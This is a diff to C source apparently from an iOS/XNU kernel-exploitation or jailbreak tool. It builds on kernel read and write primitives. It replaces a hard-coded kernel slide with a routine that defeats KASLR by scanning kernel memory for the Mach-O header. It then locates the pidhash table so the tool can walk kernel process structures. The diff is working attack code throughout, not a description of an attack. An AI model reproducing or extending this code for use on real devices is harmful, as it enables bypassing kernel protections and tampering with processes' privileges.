@@ -34,11 +34,29 @@ static kread64_t  kread64;
 static kread32_t  kread32;
 static kwrite32_t kwrite32;
 
-/* kernel text slide (IDB -> runtime), measured 2026-09-27 */
-#define KSLIDE 0x158B4000ULL
-/* pidhash table base/mask globals (IDB VAs + slide) */
-#define PIDHASH_TBL (0xfffffe00079874D0ULL + KSLIDE)
-#define PIDHASH_MSK (0xfffffe00079874D8ULL + KSLIDE)
+/* kernel text slide is randomized on every boot (KASLR). It was previously
+ * hard-coded (0x158B4000 on the 2026-09-27 boot) which broke after any
+ * reboot -> find_proc() read garbage -> "proc not found". Derive it at
+ * runtime by scanning for the kernel Mach-O header instead. */
+#define IDA_KERNEL_BASE 0xfffffe0007004000ULL   /* IDB load VA of the kernel */
+#define PIDHASH_TBL_IDA 0xfffffe00079874D0ULL   /* IDB VAs of pidhash globals */
+#define PIDHASH_MSK_IDA 0xfffffe00079874D8ULL
+
+static uint64_t g_tbl = 0, g_msk = 0;
+
+/* find the runtime kernel slide (0x4000-aligned) by locating the arm64e
+ * Mach-O header at IDA_KERNEL_BASE + slide. */
+static uint64_t find_slide(void)
+{
+    for (uint64_t s = 0; s < 0x40000000ULL; s += 0x4000ULL) {
+        uint64_t a = IDA_KERNEL_BASE + s;
+        if (kread32(a) == 0xfeedfacfU && kread32(a + 4) == 0x0100000cU) {
+            uint32_t nc = kread32(a + 16);
+            if (nc && nc < 0x200) return s;
+        }
+    }
+    return 0;
+}
 
 /* struct proc / proc_ro field offsets (xnu-8792) */
 #define PROC_PID   0x60   /* p_pid */
@@ -49,8 +67,8 @@ static kwrite32_t kwrite32;
 
 static uint64_t find_proc(pid_t pid)
 {
-    uint64_t table = kread64(PIDHASH_TBL);
-    uint64_t mask  = kread64(PIDHASH_MSK);
+    uint64_t table = kread64(g_tbl);
+    uint64_t mask  = kread64(g_msk);
     uint64_t cur   = kread64(table + (mask & (uint64_t)pid) * 8);
     for (int hops = 0; cur && hops < 512; hops++) {
         if (kread32(cur + PROC_PID) == (uint32_t)pid && kread64(cur + PROC_RO) != 0)
@@ -113,6 +131,12 @@ int main(int argc, char **argv)
         return 1;
     }
     if (init_jb()) return 1;
+
+    uint64_t slide = find_slide();
+    g_tbl = PIDHASH_TBL_IDA + slide;   /* NOTE: no longer adds a compile-time const */
+    g_msk = PIDHASH_MSK_IDA + slide;
+    printf("[*] kernel slide=0x%llx pidhash_tbl=0x%llx\n",
+           (unsigned long long)slide, (unsigned long long)g_tbl);
 
     posix_spawnattr_t attr;
     posix_spawnattr_init(&attr);
